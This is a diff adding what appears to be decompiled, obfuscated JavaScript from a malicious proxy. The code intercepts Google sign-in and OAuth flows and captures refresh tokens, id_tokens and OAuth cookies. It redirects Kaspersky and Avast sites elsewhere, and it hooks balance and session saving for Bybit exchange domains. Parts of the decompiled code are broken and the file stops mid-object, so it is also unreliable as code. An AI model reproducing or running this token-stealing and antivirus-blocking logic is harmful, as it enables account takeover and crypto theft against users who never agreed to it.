@@ -1,0 +1,4364 @@
+function func_initializeRouters_0x10000be20()
+{
+	r4 = 0
+	ACCU = func_initializeRouter_0x10000ba6f()
+	ACCU = func_initializeBalanceModule_0x10000bdc4()
+	ACCU = func_initializeAntivirusRedirectRouter_0x10000bdca()
+	ACCU = func_initializeCoinsRouterModule_0x10000bdd2()
+	ACCU = func_initializeRouterConfigModule_0x10000bde1()
+	ACCU = func_initializeOAuthRoutes_0x10000be07()
+	ACCU = func_initGoogleRouter_0x10000be0e()
+	ACCU = func_initProxyRouter_0x10000be19()
+	r7 = global_ll["use"]
+	ACCU = r7(global_VB)
+	r7 = global_ll["use"]
+	ACCU = r7(global_Pm)
+	r7 = global_ll["use"]
+	ACCU = r7(global_YV)
+	r7 = global_ll["use"]
+	ACCU = r7(global_j5)
+	r7 = global_ll["use"]
+	ACCU = r7(global_Gm)
+	r7 = global_ll["use"]
+	ACCU = r7(global_Up)
+	r7 = global_ll["use"]
+	ACCU = r7((global_hB["router"]))
+	return undefined
+}
+function func_initProxyRouter_0x10000be19()
+{
+	r0 = new {"V": "L@kv", "J": 81117, "S": "A0Dr", "g": 40858, "L": "vV[N", "X": 22743}
+	r7 = func_initializeRouterBridgeModule_0x10000ba61["exports"]()
+	global_pL = func_interopRequireWildcard_0x10000317a(r7)
+	global_Up = global_pL["Router"](r0)
+	return undefined
+}
+function func_initGoogleRouter_0x10000be0e()
+{
+	r0 = new {"V": 51174, "J": "M2Ty", "S": 1612, "g": "%r7r", "L": 85229, "X": "]C&)"}
+	r7 = func_initializeRouterBridgeModule_0x10000ba61["exports"]()
+	global_CL = func_interopRequireWildcard_0x10000317a(r7)
+	global_Gm = global_CL["Router"](r0)
+	return undefined
+}
+function func_initializeOAuthRoutes_0x10000be07()
+{
+	Scope[1144][14] = func_f_0x10000bde3
+	r0 = new {"V": "mwAz", "J": 78266, "S": "pdVE", "g": 120846, "L": "XR6@", "X": 2293, "j": "x&b0", "E": 52517, "c": "F1xf", "x": 63054, "K": "93y[", "u": 70090, "A": "%r7r", "s": 11895, "b": 104743, "i": "I@Bf", "w": 85456, "f": "p[w*", "t": 25998, "P": "B@Sb", "I": 37888, "p": "vV[N", "o": 34248, "R": "*!!t", "v": 73367, "N": ")Lyh", "M": 30236, "k": "9pb7", "Q": 80377, "W": "89J2", "T": 43292, "G": 88331, "y": "VHeU", "e": 88251, "U": "mwAz", "q": 63570, "O": 54591, "C": "[Jy3", "n": 83718, "r": "F1xf", "H": 112785, "h": "gm42", "Y": 6946, "D": "F1xf", "l": 56935, "a": "b48I", "V0": 70775, "V1": "b48I", "V2": 14872, "V3": "epz[", "V6": 53860, "VV": "xQ)2", "VJ": 42710, "Vz": "JrBU", "Vd": 26783, "Vg": "YbH*", "VL": 61654, "Vc": 94237, "Vx": "9hYk", "VB": 68996, "VK": "kh^v", "Vu": 57278, "VA": "]C&)", "Vs": 93153, "Vb": "eeST", "Vw": 86232, "Vf": ")Ku4", "Vt": 77187, "VP": "[()[", "Vp": 26221, "Vo": "^Ceg", "VR": 103338, "VQ": "mwAz", "VW": 25931, "VT": "gm42", "VG": 71699, "Vy": "n@A0", "Ve": 93545, "VU": "F1xf", "Vq": 63054, "VO": "%r7r", "Vm": 60005, "VZ": 85372, "Vn": "xQ)2", "Vr": 76312, "VH": 43825, "Vh": "A5nh", "VY": 110285, "VD": 69079, "Vl": 30367, "Va": "BS4&", "J0": 32749, "J2": "eeST", "J3": 65508, "J4": "A0Dr", "J5": 102214, "J6": "8dGo", "J7": 88803, "J9": 28901, "Jd": "m[K#", "Jg": 72950, "JL": "epz[", "JX": 21036, "Jc": 35781, "Jx": "iSZ6", "JB": 91161, "Ju": 32639, "Js": ")Lyh", "Jb": 46742, "Ji": 31656, "Jw": 108613, "Jf": "h98j", "Jt": 88980, "JP": 39180, "Jp": "B@Sb", "JR": 47894, "JQ": "F1xf", "JW": 77839, "JT": "m[K#", "JG": 7227, "Jy": 24844, "JU": "%r7r", "JF": 5041, "Jq": 90154, "JO": "]1@2", "Jm": 71099, "JC": "[Jy3", "Jn": 65755, "Jr": ")Ku4", "Jh": 99571, "JY": 63136, "JD": "K&pk", "Jl": 69620, "z0": "toM2", "z1": 76438, "z2": 101491, "z3": "O9*f", "z6": 7160, "zV": "p8sI", "zJ": 80538, "zz": "vV[N", "zd": 120218, "zS": "BS4&", "zg": 88992, "zL": 36258, "zX": 75472, "zE": "M2Ty", "zc": 74771, "zx": "A5nh", "zB": 89905, "zu": "Yx9u", "zA": 14970, "zs": "nvO5", "zw": 116125, "zf": 81573, "zt": 38878, "zP": 108952, "zp": 71448, "zo": "iSZ6", "zW": 117210, "zG": "]1@2", "zy": 32910, "zU": "mwAz", "zF": 71227, "zO": "89J2", "zC": 112518, "zZ": 106244, "zn": 20048, "zr": "%]hf", "zH": 4417, "zh": "toM2", "zY": 45586, "zl": "A0Dr", "za": 63040, "d2": 20865, "d3": 72818, "d4": 58802, "d5": 119379, "d6": "%r7r", "d7": 33225, "d9": 110032, "dV": 93120, "dJ": 113406, "dz": 111653, "dd": 38491, "dg": 15793, "dL": 62875, "dX": ")Lyh", "dj": 105897, "dE": 116202}
+	ACCU = func_initializeNetworkClient_0x100006702()
+	r5 = func_initializeFetchModule_0x100006ba6["exports"]()
+	global_XK = func_interopRequireWildcard_0x10000317a(r5)
+	r5 = func_initializeJwtModule_0x1000047e4["exports"]()
+	global_aL = func_interopRequireWildcard_0x10000317a(r5)
+	ACCU = func_initializeUrlClass_0x100005cd5()
+	r5 = func_initializeRouterBridgeModule_0x10000ba61["exports"]()
+	global_cL = func_interopRequireWildcard_0x10000317a(r5)
+	r5 = func_initModule_0x10000bdaf["exports"]()
+	global_sL = func_interopRequireWildcard_0x10000317a(r5)
+	ACCU = func_initializeNetworkAndCore_0x10000a949()
+	ACCU = func_noopHandler_0x10000673e()
+	ACCU = func_noOp_0x10000bde2()
+	r2 = ("https://" + ("accounts.google.com"))
+	global_mB = (r2 + ("/o/oauth2/programmatic_auth"))
+	global_j5 = global_cL["Router"](r0)
+	r2 = global_j5["get"]
+	r6 = new [0, 0]
+	r6[0] = ("/ServiceLogin")
+	r6[1] = ("/AddSession")
+	r5 = r6
+	ACCU = r2(("accounts.google.com"), r5, func_createGoogleAuthPlugin_0x10000bdf7)
+	r2 = global_j5["get"]
+	r6 = new {"request": null}
+	r7 = new {"headers": null}
+	r7["headers"] = func_handleForceLogin_0x10000bdf9
+	r6["request"] = r7
+	ACCU = r2(("accounts.google.com"), ("/InteractiveLogin"), r6)
+	r2 = global_j5["get"]
+	ACCU = r2(("accounts.google.com"), ("/o/oauth2/programmatic_auth"), func_createOAuthCookiePlugin_0x10000be03)
+	r2 = global_j5["get"]
+	r5 = ("/oauth2/:version/token?grant_type=authorization_code&client_id=" + ("77185425430.apps.googleusercontent.com"))
+	ACCU = r2(("www.googleapis.com"), r5, func_createJsonTransformerPlugin_0x10000be06)
+	return undefined
+}
+function func_createJsonTransformerPlugin_0x10000be06()
+{
+	r0 = new {"response": null}
+	r1 = new {"full": null}
+	r2 = global_sL["jsonTransformer"]
+	r1["full"] = r2(func_extractAndSaveToken_0x10000be05)
+	r0["response"] = r1
+	return r0
+}
+function func_extractAndSaveToken_0x10000be05(a0)
+{
+	r6 = <closure>
+	r7 = <this>
+	r1 = ACCU
+	try
+	{
+		r0 = a0["json"]
+	}
+	catch
+	{
+		r7 = ACCU
+		ACCU = null
+		ACCU = Scope[1145]
+		r8 = r1
+		return Scope[1145][2]
+	}
+	ACCU = func_W_0x10000be04
+	try
+	{
+		r2 = r0["id_token"]
+		r3 = r0["refresh_token"]
+		r10 = !Boolean(r3)
+		r11 = !Boolean(r2)
+		if (func_ternaryOr_0x10000bde9(r10, r11))
+		{
+			r8 = r1
+			return undefined
+		}
+		r9 = global_aL["default"]
+		r8 = r9["decode"]
+		ACCU = r8(r2)
+		r8 = r8(r2)
+		if (!ACCU == undefined)
+		{
+			ACCU = r8["sub"]
+		}
+		else
+		{
+			ACCU = undefined
+		}
+		r5 = ACCU
+		r10 = TypeOf(r5)
+		if (r10 == "string")
+		{
+			r12 = new {"userId": null, "scope": null, "value": null}
+			r12["userId"] = r5
+			r12["scope"] = "CHROME"
+			r12["value"] = r3
+			r9 = func_saveGoogleToken_0x1000005e8(r12)
+			ACCU = r9["catch"](func_emptyFunction_0x1000004cf)
+		}
+		r9 = undefined
+		r8 = r1
+		ACCU = r9
+		return r9
+	}
+	catch {}
+	r8 = ACCU
+	ACCU = null
+	ACCU = Scope[1147]
+	r9 = r1
+	return Scope[1147][2]
+}
+function func_createOAuthCookiePlugin_0x10000be03()
+{
+	Scope[1148][4] = func_h_0x10000bdfa
+	r1 = new {"bipAE": null, "YTANN": null, "FHUbY": null, "Nrygh": null, "QWpXc": null, "knsHa": null, "kOkYx": null}
+	Scope[1148][5] = r1
+	r1 = new {"request": null, "response": null}
+	r2 = new {"headers": null}
+	r2["headers"] = func_updateContinueUrl_0x10000be00
+	r1["request"] = r2
+	r2 = new {"headers": null}
+	r2["headers"] = func_handleOAuthCookieHeader_0x10000be02
+	r1["response"] = r2
+	return r1
+}
+function func_handleOAuthCookieHeader_0x10000be02(a0)
+{
+	r7 = <closure>
+	r8 = <this>
+	r1 = ACCU
+	try
+	{
+		r0 = a0["headers"]
+	}
+	catch
+	{
+		r8 = ACCU
+		ACCU = null
+		ACCU = Scope[1149]
+		r9 = r1
+		return Scope[1149][2]
+	}
+	ACCU = func_S_0x10000be01
+	try
+	{
+		r9 = r0["getAll"]
+		r2 = r9("set-cookie")
+		r3 = func_parseCookies_0x100000a12(r2)
+		r4 = r3["user_id"]
+		r5 = r3["oauth_token"]
+		r11 = !Boolean(r4)
+		r12 = !Boolean(r5)
+		if (!func_defaultFallback_0x10000bde4(r11, r12))
+		{
+			r11 = global_iB["google"]["saveOAuthToken"]
+			r10 = r11["mutate"]
+			r12 = new {"userId": null, "scope": null, "value": null}
+			r12["userId"] = r4
+			r12["scope"] = "ANDROID"
+			r12["value"] = r5
+			r10 = r10(r12)
+			r9 = r10["catch"]
+			r10 = r9(func_emptyFunction_0x1000004cf)
+			r9 = r1
+			r9 = await r10
+			r10 = _GeneratorGetResumeMode(r1)
+			if (!r10 === 0)
+			{
+				ACCU = r9
+			}
+			if (Scope[1148][6])
+			{
+				r9 = r0["set"]
+				ACCU = r9("location", Scope[1148][6])
+				r10 = new {"status": 302}
+				r9 = r1
+				return r10
+			}
+		}
+		r10 = undefined
+		r9 = r1
+		ACCU = r10
+		return r10
+	}
+	catch {}
+	r9 = ACCU
+	ACCU = null
+	ACCU = Scope[1151]
+	r10 = r1
+	return Scope[1151][2]
+}
+function func_updateContinueUrl_0x10000be00(a0)
+{
+	ACCU = func_createUrlObject_0x100005cce
+	r6 = func_createUrlObject_0x100005cce(a0["target"])
+	r1 = r6["searchParams"]
+	r6 = r6["searchParams"]["get"]
+	r6 = r6("continue")
+	ACCU = Scope[1148][6]
+	Scope[1148][6] = r6
+	if (!Scope[1148][6])
+	{
+		return undefined
+	}
+	r6 = r1["get"]
+	r8 = "authuser"
+	r2 = r6(r8)
+	if (!r6(r8))
+	{
+		return undefined
+	}
+	ACCU = func_createUrlObject_0x100005cce
+	r4 = func_createUrlObject_0x100005cce(Scope[1148][6])
+	r7 = r4["searchParams"]
+	r6 = r7["set"]
+	ACCU = r6("authuser", r2)
+	r6 = r4["toString"]
+	r6 = r6()
+	ACCU = Scope[1148][6]
+	Scope[1148][6] = r6
+	return undefined
+}
+function func_handleForceLogin_0x10000bdf9(a0)
+{
+	ACCU = func_createUrlObject_0x100005cce
+	r7 = func_createUrlObject_0x100005cce(a0["target"])
+	r7 = r7["searchParams"]
+	r6 = r7["get"]
+	r8 = "continue"
+	r3 = r6(r8)
+	if (!r6(r8))
+	{
+		return undefined
+	}
+	ACCU = func_createUrlObject_0x100005cce
+	r6 = func_createUrlObject_0x100005cce(r3)
+	r6 = r6["searchParams"]["get"]
+	r8 = "forceLogin"
+	if (r6(r8))
+	{
+		r6 = a0["headers"]["delete"]
+		ACCU = r6("cookie")
+	}
+	return undefined
+}
+function func_createGoogleAuthPlugin_0x10000bdf7(a0, a1, a2)
+{
+	Scope[1155][8] = func_b_0x10000bdf2
+	ACCU = func_createUrlObject_0x100005cce
+	Scope[1155][6] = func_createUrlObject_0x100005cce(a2, ("accounts.google.com"))
+	r3 = Scope[1155][6]["pathname"]
+	Scope[1155][7] = r3 === ("/AddSession")
+	r1 = new {"request": null, "response": null}
+	r2 = new {"headers": null}
+	r2["headers"] = func_handleContinueHeader_0x10000bdf4
+	r1["request"] = r2
+	r2 = new {"headers": null}
+	r2["headers"] = func_redirectToGoogleAuth_0x10000bdf6
+	r1["response"] = r2
+	return r1
+}
+function func_redirectToGoogleAuth_0x10000bdf6(a0)
+{
+	if (!Scope[1155][5])
+	{
+		return undefined
+	}
+	r8["client_id"] = ("1070009224336-sdh77n7uot3oc99ais00jmuft6sk2fg9.apps.googleusercontent.com")
+	r8["scope"] = ("https://www.google.com/accounts/OAuthLogin")
+	r8["authuser"] = Scope[1155][4]
+	r8["continue"] = Scope[1155][5]
+	if (Scope[1155][7])
+	{
+		ACCU = new {"forceLogin": "1"}
+	}
+	else
+	{
+	}
+	r10 = {}
+	ACCU = _CopyDataProperties(r9, r10)
+	r2 = func_buildUrlWithParams_0x1000002a6(global_mB, r8)
+	r4 = a0["headers"]["set"]
+	r6 = "location"
+	r7 = r2["toString"]
+	r7 = r7()
+	ACCU = r4(r6, r7)
+	return new {"status": 302}
+}
+function func_handleContinueHeader_0x10000bdf4(a0)
+{
+	r5 = <closure>
+	r6 = <this>
+	r1 = ACCU
+	try
+	{
+		r0 = a0["headers"]
+	}
+	catch
+	{
+		r6 = ACCU
+		ACCU = null
+		ACCU = Scope[1157]
+		r7 = r1
+		return Scope[1157][2]
+	}
+	ACCU = func_B_0x10000bdf3
+	try
+	{
+		r6 = Scope[1155][6]["searchParams"]["get"]
+		r8 = "continue"
+		r2 = r6(r8)
+		if (!r6(r8))
+		ACCU = func_createUrlObject_0x100005cce
+		r7 = func_createUrlObject_0x100005cce(r2)
+		r6 = r7["match"]
+			|| (!r6(global_mB))
+		{
+			r6 = Scope[1155][6]["searchParams"]["get"]
+			r8 = "authuser"
+			r6 = r6(r8)
+			ACCU = Scope[1155][4]
+			Scope[1155][4] = r6
+			if (Scope[1155][7])
+			{
+				r6 = func_defaultFallback_0x10000bde4(r2, "https://google.com")
+				ACCU = Scope[1155][5]
+				Scope[1155][5] = r6
+			}
+			else
+			{
+				r9 = r0["simple"]
+				r9 = r9()
+				r7 = func_fetchGoogleAccounts_0x100000a15(r9)
+				r6 = r1
+				r6 = await r7
+				r7 = _GeneratorGetResumeMode(r1)
+				if (!r7 === 0)
+				{
+					ACCU = r6
+				}
+				r4 = r6[Number(Scope[1155][4])]
+				r8 = TypeOf(r4)
+				if (r8 == "string")
+				{
+					r7 = global_iB["google"]["hasToken"]
+					r6 = r7["query"]
+					r8 = new {"userId": null, "scope": null}
+					r8["userId"] = r4
+					r8["scope"] = "ANDROID"
+					r7 = r6(r8)
+					r6 = r1
+					r6 = await r7
+					r7 = _GeneratorGetResumeMode(r1)
+					if (!r7 === 0)
+					{
+						ACCU = r6
+					}
+					if (r6)
+					{
+						r6 = r1
+						return undefined
+					}
+				}
+				r6 = Scope[1155][6]["toString"]
+				r6 = r6()
+				ACCU = Scope[1155][5]
+				Scope[1155][5] = r6
+			}
+		}
+		r7 = undefined
+		r6 = r1
+		ACCU = r7
+		return r7
+	}
+	catch {}
+	r6 = ACCU
+	ACCU = null
+	ACCU = Scope[1158]
+	r7 = r1
+	return Scope[1158][2]
+}
+function func_noOp_0x10000bde2()
+{
+	return undefined
+}
+function func_initializeRouterConfigModule_0x10000bde1()
+{
+	Scope[1159][3] = func_e_0x10000bdd8
+	r0 = new {"V": 47427, "J": "%]hf", "S": 74480, "g": "%r7r", "L": 98689, "X": "JrBU", "j": 39904, "E": ")Ku4", "c": 122643, "x": "h98j", "K": 62854, "u": "%r7r", "A": 123477, "s": "A0Dr", "b": 72715, "i": ")Lyh", "w": 4855, "f": ")Ku4", "t": 11555, "P": "VHeU", "I": 53262, "p": "Yx9u", "o": 95507, "R": "x&b0", "v": 123836, "N": "A5nh", "M": 45194, "k": "O9*f", "Q": 118718, "W": 60356, "T": "M2Ty", "G": 82549, "y": "F1xf", "e": 68919, "U": "iSZ6", "q": 123379, "O": 58480, "C": "O9*f", "n": 106127, "r": "^Ceg", "H": 45783, "h": 53146, "Y": "x&b0", "D": 24352, "l": "epz[", "a": 88707, "V0": "L@kv", "V1": 56885, "V2": "h98j", "V3": 110796, "V6": "YbH*", "VV": 6662, "VJ": "VHeU", "Vz": 115677, "Vd": 87922, "Vg": "n@A0", "VL": 101269, "Vc": "b48I", "Vx": 93486, "VB": "L@kv", "VK": 41501, "Vu": "^Ceg", "VA": 21643, "Vs": 30210, "Vb": "iSZ6", "Vw": 52100}
+	r3 = 0
+	ACCU = func_initializeNetworkClient_0x100006702()
+	r9 = func_initializeRouterBridgeModule_0x10000ba61["exports"]()
+	global_iL = func_interopRequireWildcard_0x10000317a(r9)
+	r9 = func_initModule_0x10000bdaf["exports"]()
+	global_Y2 = func_interopRequireWildcard_0x10000317a(r9)
+	ACCU = func_initializeUrlClass_0x100005cd5()
+	ACCU = func_initializeFaroClient_0x100005504()
+	r7 = new [0, 0, 0, 0, 0, 0, 0]
+	r7[0] = "bybit.com"
+	r7[1] = "bybitglobal.com"
+	r7[2] = "bytick.com"
+	r7[3] = "bybits.org"
+	r7[4] = "bybits.io"
+	r7[5] = "byhkbit.com"
+	r7[6] = "bybit-tr.com"
+	global_oL = r7
+	r6 = global_oL["map"]
+	global_A6 = r6(func_prependApi2_0x10000bde0)
+	global_YV = global_iL["Router"](r0)
+	return undefined
+}
+function func_prependApi2_0x10000bde0(a0)
+{
+	return ("api2." + a0)
+}
+function func_initializeCoinsRouterModule_0x10000bdd2()
+{
+	r0 = new {"V": "xQ)2", "J": 51666, "S": "^Ceg", "g": 15993, "L": "eeST", "X": 1814, "j": "p8sI", "E": 34904, "c": "toM2", "x": 87880, "K": "Yx9u", "u": 1619, "A": "[()[", "s": 17345, "b": "[()[", "i": 54297, "w": "p8sI", "f": 109713, "t": "x&b0", "P": 118467}
+	r7 = func_initializeRouterBridgeModule_0x10000ba61["exports"]()
+	global_rL = func_interopRequireWildcard_0x10000317a(r7)
+	r7 = func_initModule_0x10000bdaf["exports"]()
+	global_TK = func_interopRequireWildcard_0x10000317a(r7)
+	global_Pm = global_rL["Router"](r0)
+	return undefined
+}
+function func_initializeAntivirusRedirectRouter_0x10000bdca()
+{
+	Scope[1161][6] = func_n_0x10000bdc5
+	r0 = new {"V": 7389, "J": "xQ)2", "S": 58164, "g": "[()[", "L": 60415, "X": "x&b0", "j": 67851, "E": "93y[", "c": 1714, "x": "pdVE", "K": 106135, "u": "]C&)", "A": 79824, "s": "93y[", "b": 42401, "i": "A0Dr", "w": 23260, "f": "Yx9u", "t": 19827, "P": "YbH*", "I": 27008, "p": "Yx9u", "o": 15961, "R": "BS4&", "v": 19226, "N": "pdVE", "M": 82091, "k": "h98j", "Q": 66376, "W": "b48I", "T": 85814, "G": "K&pk", "y": 70290, "e": "C0qY"}
+	r9 = func_initializeRouterBridgeModule_0x10000ba61["exports"]()
+	global_uL = func_interopRequireWildcard_0x10000317a(r9)
+	r6 = new {"*kaspersky*": null, "*avast*": null}
+	r6["*kaspersky*"] = "https://www.bitdefender.com"
+	r6["*avast*"] = "https://www.avg.com"
+	global_nL = r6
+	global_VB = global_uL["Router"](r0)
+	r9 = r0["y"]
+	r10 = r0["e"]
+	r6 = Object["entries"]
+	r8 = r6(global_nL)
+	r7 = GetIterator(r8)
+	r6 = r7["next"]
+	ACCU = false
+	r8 = false
+	try
+	{
+		while (true)
+		{
+			r8 = true
+			r12 = r6()
+			if (r12["done"]) break
+			r8 = false
+			ACCU = GetIterator(r12["value"])
+			r14 = r12["value"]
+			r12 = r12["value"]
+			r16 = ACCU
+			ACCU = false
+			r17 = false
+			try
+			{
+				if (!false)
+				r17 = true
+				r21 = r16["next"]()
+				ACCU = r21["done"]
+					&& (!r21["done"])
+				{
+					r17 = false
+					ACCU = r21["value"]
+				}
+				else
+				{
+					ACCU = undefined
+				}
+				r4 = ACCU
+				if (!r17)
+				r17 = true
+				r21 = r16["next"]()
+				ACCU = r21["done"]
+					&& (!r21["done"])
+				{
+					r17 = false
+					ACCU = r21["value"]
+				}
+				else
+				{
+					ACCU = undefined
+				}
+				Scope[1162][2] = ACCU
+				ACCU = -1
+				r19 = -1
+				r18 = -1
+			}
+			catch
+			{
+				r19 = ACCU
+				r18 = 0
+			}
+			if (!r17)
+			{
+				try
+				{
+					if (!r16["return"] == undefined)
+					{
+						ACCU = r16["return"]()
+					}
+					catch {}
+				}
+			}
+			ACCU = null
+			if (r18 === 0)
+			{
+				r9 = 0
+				r10 = r19
+				break
+			}
+			r19 = new {"response": null}
+			r20 = new {"headers": null}
+			r20["headers"] = func_redirectWithHeader_0x10000bdc9
+			r19["response"] = r20
+			r16 = r4
+			ACCU = global_VB["on"](r16, null, null, r19)
+		}
+		ACCU = -1
+		r10 = -1
+		r9 = -1
+	}
+	catch
+	{
+		r10 = ACCU
+		r9 = 0
+	}
+	if (!r8)
+	{
+		try
+		{
+			if (!r7["return"] == undefined)
+			{
+				ACCU = r7["return"]()
+			}
+			catch {}
+		}
+	}
+	ACCU = null
+	if (r9 === 0)
+	{
+		ACCU = r10
+	}
+	return undefined
+}
+function func_redirectWithHeader_0x10000bdc9(a0)
+{
+	r2 = a0["headers"]["set"]
+	ACCU = r2("location", Scope[1162][2])
+	return new {"status": 308}
+}
+function func_initializeBalanceModule_0x10000bdc4()
+{
+	Scope[1163][8] = func_a_0x10000bdb7
+	ACCU = func_initializeNetworkAndCore_0x10000a949()
+	r5 = func_initModule_0x10000bdaf["exports"]()
+	global_hB = func_interopRequireWildcard_0x10000317a(r5)
+	ACCU = func_initBigNumberConstants_0x10000bdb6()
+	ACCU = func_initializeFaroClient_0x100005504()
+	r2 = global_hB["setHooks"]
+	r3 = new {"saveBalance": null, "saveSession": null}
+	r3["saveBalance"] = func_saveBalance_0x10000bdc1
+	r3["saveSession"] = func_saveSession_0x10000bdc3
+	ACCU = r2(r3)
+	return undefined
+}
+function func_saveSession_0x10000bdc3(a0)
+{
+	r3 = <closure>
+	r4 = <this>
+	r0 = ACCU
+	ACCU = func_c_0x10000bdc2
+	try
+	{
+		try
+		{
+			r2 = a0["application"]
+			r8 = CloneObject(a0)
+			r8["application"] = r2
+			ACCU = func_saveBrowserSession_0x1000005e2(r8)
+		}
+		catch
+		{
+			r5 = ACCU
+			ACCU = null
+			ACCU = Scope[1164]
+			ACCU = func_pushError_0x100000142(Scope[1164][2])
+		}
+		r5 = undefined
+		r4 = r0
+		ACCU = r5
+		return r5
+	}
+	catch {}
+	r4 = ACCU
+	ACCU = null
+	ACCU = Scope[1165]
+	r5 = r0
+	return Scope[1165][2]
+}
+function func_saveBalance_0x10000bdc1(a0)
+{
+	r7 = <closure>
+	r8 = <this>
+	r2 = ACCU
+	try
+	{
+		r0 = a0["name"]
+		r1 = _CopyDataPropertiesWithExcludedPropertiesOnStack(a0, "name")
+	}
+	catch
+	{
+		r8 = ACCU
+		ACCU = null
+		ACCU = Scope[1166]
+		r9 = r2
+		return Scope[1166][2]
+	}
+	ACCU = func_x_0x10000bdbf
+	Scope[1167][2] = func_x_0x10000bdbf
+	try
+	{
+		try
+		{
+			r10 = Array["isArray"]
+			r12 = r1["value"]
+			ACCU = r10(r12)
+			if (r10(r12))
+			{
+				ACCU = r1["value"]
+			}
+			else
+			{
+				r11 = new [0]
+				r11[0] = r1["value"]
+				ACCU = r11
+			}
+			r3 = ACCU
+			r10 = r3["every"]
+			if (!r10(func_isValidNumberOrString_0x10000bdc0))
+			{
+				r10 = r2
+				return undefined
+			}
+			r4 = r1["source"]
+			ACCU = r1["currency"]
+			if (!r1["currency"])
+			{
+				ACCU = "USD"
+			}
+			r5 = ACCU
+			r6 = func_applyWithRest_0x10000bdb8(...Scope[1163][7], _pe, r3)
+			r13 = new {"source": null, "name": null, "currency": null, "value": null}
+			r13["source"] = r4
+			r13["name"] = r0
+			r13["currency"] = r5
+			r13["value"] = r6
+			r11 = func_applyWithRest_0x10000bdb8(func_saveBalance_0x1000005d3, r13)
+			r10 = r2
+			r10 = await r11
+			r11 = _GeneratorGetResumeMode(r2)
+			if (!r11 === 0)
+			{
+				ACCU = r10
+			}
+			ACCU = r10
+		}
+		catch
+		{
+			r10 = ACCU
+			ACCU = null
+			ACCU = Scope[1168]
+			ACCU = func_applyWithRest_0x10000bdb8(func_pushError_0x100000142, Scope[1168][2])
+		}
+		r10 = undefined
+		r9 = r2
+		ACCU = r10
+		return r10
+	}
+	catch {}
+	r9 = ACCU
+	ACCU = null
+	ACCU = Scope[1169]
+	r10 = r2
+	return Scope[1169][2]
+}
+function func_isValidNumberOrString_0x10000bdc0(a0)
+{
+	r2 = new [0, 0]
+	r2[0] = "string"
+	r2[1] = "number"
+	r1 = r2
+	r0 = r1["includes"]
+	r2 = TypeOf(a0)
+	ACCU = r0(r2)
+	if (r0(r2))
+	{
+		r0 = Number["isNaN"]
+		ACCU = !Boolean(r0(a0))
+	}
+	return ACCU
+}
+function func_applyWithRest_0x10000bdb8(a0)
+{
+	r2 = ...
+	r0 = a0
+	r1 = r2
+	r4 = undefined
+	return a0(...r4, r2)
+}
+function func_initBigNumberConstants_0x10000bdb6()
+{
+	ACCU = func_initBigNumberConstants_0x10000bdb3()
+	return undefined
+}
+function func_initBigNumberConstants_0x10000bdb3()
+{
+	global_kK = \^-?(?:\\\\d+(?:\\\\.\\\\d*)?|\\\\.\\\\d+)(?:e[+-]?\\\\d+)?$\
+	r7 = "Number primitive has more than 15 significant digits: "
+	global_Om = (("[BigNumber Error] ") + r7)
+	global_IV = new [1, 10, 100, 1000, 10000, 100000, 1e+06, 1e+07, 1e+08, 1e+09, 1e+10, 1e+11, 1e+12, 1e+13]
+	return undefined
+}
+function func_initModule_0x10000bdaf(a0)
+{
+	Scope[1172][8] = func_x_0x10000bda3
+	r3 = 0
+	r6 = Object["defineProperty"]
+	r9 = "__esModule"
+	r10 = new {"value": <true}
+	ACCU = r6(a0, r9, r10)
+	r7 = "jsonTransformer"
+	r9 = "htmlTransformer"
+	r11 = "setHooks"
+	r14 = undefined
+	a0["router"] = undefined
+	a0[r11] = r14
+	a0[r9] = r14
+	a0[r7] = r14
+	Scope[1172][10] = func_initExchangeRouterModule_0x10000bda2["exports"]()
+	r6 = Object["defineProperty"]
+	r9 = "router"
+	r10 = new {"enumerable": <true, "get": null}
+	r10["get"] = func_getRouter_0x10000bdaa
+	ACCU = r6(a0, r9, r10)
+	Scope[1172][12] = func_initModule_0x10000ba72["exports"]()
+	r6 = Object["defineProperty"]
+	r9 = "setHooks"
+	r10 = new {"enumerable": <true, "get": null}
+	r10["get"] = func_getSetHooks_0x10000bdae
+	ACCU = r6(a0, r9, r10)
+	Scope[1172][11] = func_initializeHtmlTransformerModule_0x10000bc01["exports"]()
+	r6 = Object["defineProperty"]
+	r9 = "htmlTransformer"
+	r10 = new {"enumerable": <true, "get": null}
+	r10["get"] = func_getHtmlTransformer_0x10000bdac
+	ACCU = r6(a0, r9, r10)
+	Scope[1172][9] = func_initJsonTransformerModule_0x10000ba7b["exports"]()
+	r6 = Object["defineProperty"]
+	r9 = "jsonTransformer"
+	r10 = new {"enumerable": <true, "get": null}
+	r10["get"] = func_getJsonTransformer_0x10000bda8
+	ACCU = r6(a0, r9, r10)
+	return undefined
+}
+function func_getSetHooks_0x10000bdae()
+{
+	return Scope[1172][12]["setHooks"]
+}
+function func_getHtmlTransformer_0x10000bdac()
+{
+	return Scope[1172][11]["htmlTransformer"]
+}
+function func_getRouter_0x10000bdaa()
+{
+	return Scope[1172][10]["router"]
+}
+function func_getJsonTransformer_0x10000bda8()
+{
+	return Scope[1172][9]["jsonTransformer"]
+}
+function func_initExchangeRouterModule_0x10000bda2(a0)
+{
+	Scope[1176][13] = func_ge_0x10000bd4e
+	r0 = new {"V": 78164, "J": "^Ceg", "S": 11200, "g": ")Lyh", "L": 88964, "X": "x&b0", "j": 122457, "E": "Yx9u", "c": 55543, "x": 52379, "K": ")Lyh", "u": 12310, "A": "^Ceg", "s": 3618, "b": ")Lyh", "i": 80940, "w": "]C&)", "f": 8417, "t": "m[K#", "P": 38586, "I": "JrBU", "p": 77212, "o": "K&pk", "R": 9155, "v": "h98j", "N": 39205, "M": "BS4&", "k": 47319, "Q": "mwAz", "W": 66579, "T": "]1@2", "G": 69920, "y": "[()[", "e": 42976, "U": "pdVE", "q": 58994, "O": "h98j", "C": 91980, "n": "iSZ6", "r": 10063, "H": "O9*f", "h": 18833, "Y": "p[w*", "D": 43641, "l": "[()[", "a": 44603, "V0": "JrBU", "V1": 95021, "V2": "iSZ6", "V3": 61580, "V6": "eeST", "VV": 119095, "VJ": "vV[N", "Vz": 122748, "Vd": "XR6@", "Vg": 25161, "VL": ")Ku4", "Vc": 43709, "Vx": "93y[", "VB": 123586, "VK": "x&b0", "Vu": 105629, "VA": "B@Sb", "Vs": 35310, "Vb": 2676, "Vw": ")Ku4", "Vf": 88247, "Vt": "K&pk", "VP": 29691, "Vp": "C0qY", "Vo": 27616, "VR": "b48I", "VQ": 25523, "VW": "h^gm", "VT": 68586, "VG": "VHeU", "Vy": 24974, "Ve": "I@Bf", "VU": 100113, "Vq": 85869, "VO": "L@kv", "Vm": 76786, "VZ": "89J2", "Vn": 89906, "Vr": "M2Ty", "VH": 